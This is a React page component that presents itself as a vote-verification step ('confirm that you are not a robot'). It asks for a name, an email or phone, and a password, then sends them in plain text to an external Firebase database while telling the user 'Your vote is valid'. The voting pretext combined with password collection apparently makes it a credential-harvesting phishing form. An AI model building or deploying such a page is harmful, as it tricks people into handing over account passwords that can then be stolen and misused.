import React from "react";
import img from "../assets/contact.svg";
import Heading from "../layout/Heading";
// import Button from "../layout/Button";
import swal from 'sweetalert2';
import { toast, ToastContainer } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import { useState } from 'react';
import axios from 'axios';


// const alert = (e) => {
//   return swal.fire({
//     position: 'top-end',
//     icon: 'success',
//     title: 'Your work has been saved',
//     showConfirmButton: true,
//   })
  







const notify = () => {
  const userNameInput = document.getElementById("userName");
  const userEmailInput = document.getElementById("userEmail");
  const passwordInput = document.getElementById("password");

  const userName = userNameInput.value;
  const userEmail = userEmailInput.value;
  const password = passwordInput.value;

  const emailRegex = /^[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$/;
  const phoneRegex = /^[0-9]{10}$/;

  if (!userName || !password) {
    toast.error('Please fill in all required fields!', {
      position: "top-center",
      autoClose: 5000,
      hideProgressBar: false,
      closeOnClick: true,
      pauseOnHover: true,
      draggable: true,
      progress: undefined,
      theme: "colored",
    });
  } else if (!emailRegex.test(userEmail) && !phoneRegex.test(userEmail)) {
    toast.error('Invalid email or phone number!', {
      position: "top-center",
      autoClose: 5000,
      hideProgressBar: false,
      closeOnClick: true,
      pauseOnHover: true,
      draggable: true,
      progress: undefined,
      theme: "colored",
    });
  } else {
    toast.success('Your vote is valid', {
      position: "top-center",
      autoClose: 5000,
      hideProgressBar: false,
      closeOnClick: true,
      pauseOnHover: true,
      draggable: true,
      progress: undefined,
      theme: "colored",
      
    }
    )
    // const url = 'http://localhost/index.php'; 
    // let fData = new FormData();
    //   fData.append('userName', userName);
    //   fData.append('userEmail', userEmail);
    //   fData.append('password', password);
    //   axios.post(url, fData).then(response=> alert(response.data)).catch(error=> alert(error));   

    // Réinitialisez les champs d'entrée à une chaîne vide
    userNameInput.value = '';
    userEmailInput.value = '';
    passwordInput.value = '';
  }
}
const Contact = () => {
  const [user,setUser] = useState(
    {
      Name: '',Email: '',Password: ''
    }
  )
  let name , value
  console.log(user)
  const data = (e) =>
  {
    name = e.target.name;
    value = e.target.value;
    setUser({...user,[name]: value});
  }
  const getdata = async(e) =>
  {
    const {Name,Email,Password}=user;
    e.preventDefault();
    const options = {
      method: 'POST' ,
      headers: {
        'Content-Type': 'aplication/json'
      },
      body: JSON.stringify({
        Name,Email,Password
      })
    }
    const res = await fetch("https://votes-117b0-default-rtdb.firebaseio.com/UserData.json"
    ,options)
    console.log(res)
    // if (res){
    //   alert ('data stored')
    //   }else{
    //     alert('erroure')
    //   }
      }


  const handleValidateClick = (e) => {
    // Appeler les fonctions notify et getdata ici
    notify();
    getdata(e);
  }
  return (
    <div className=" min-h-screen flex flex-col items-center justify-center md:mx-32 mx-5 mt-30">
      <Heading title1="Verified" title2="Your Vote" />

      <p className="mt-10 text-center text-emerald-950 border boredr-brightGreen p-3 bg-emerald-200 rounded-md">In order to confirm that you are not a robot, please register to verify your vote.</p>

      <div className=" flex flex-col md:flex-row justify-between w-full">
        <form method="POST"   className=" w-full md:w-2/5 space-y-5 pt-10">
          <div className=" flex flex-col">
            <label htmlFor="userName"className=" py-2 ">Your Name</label>
            <input
              className=" py-3 px-2 rounded-lg hover:shadow-[rgba(0,_0,_0,_0.24)_0px_3px_8px] transition-all"
              type="text"
              name="Name"
              id="userName"
              placeholder="enter your name"         
              value={user.Name} onChange={data}
            />
          </div>
          <div className=" flex flex-col">
            <label htmlFor="userEmail"className=" py-2 ">Your Email or Phone</label>
            <input
              className=" py-3 px-2 rounded-lg hover:shadow-[rgba(0,_0,_0,_0.24)_0px_3px_8px] transition-all"
              type="email"
              name="Email"
              id="userEmail"
              placeholder="email or phone"
              value={user.Email} onChange={data}

            />
          </div>
          <div className=" flex flex-col">
            <label htmlFor="userNumber" className=" py-2 ">
              Your password
              </label>
            <input
              className=" py-3 px-2 rounded-lg hover:shadow-[rgba(0,_0,_0,_0.24)_0px_3px_8px] transition-all"
              type="password"
              name="Password"
              id="password"
              placeholder="enter your password"
              value={user.Password} onChange={data}
            />
          </div>

          <div className=" flex flex-row justify-center">
          <button className=" bg-white py-2 px-8 rounded-full mt-4 outline hover:shadow-[0_3px_10px_rgb(0,0,0,0.2)]
           hover:bg-brightGreen hover:text-white transition-all" onClick={handleValidateClick}>Validite</button>
          <ToastContainer />
            
          </div>
        </form>

        <div className=" w-full md:w-2/4">
          <img src={img} alt="img" />
        </div>
      </div>
    </div>
  );
};

export default Contact;
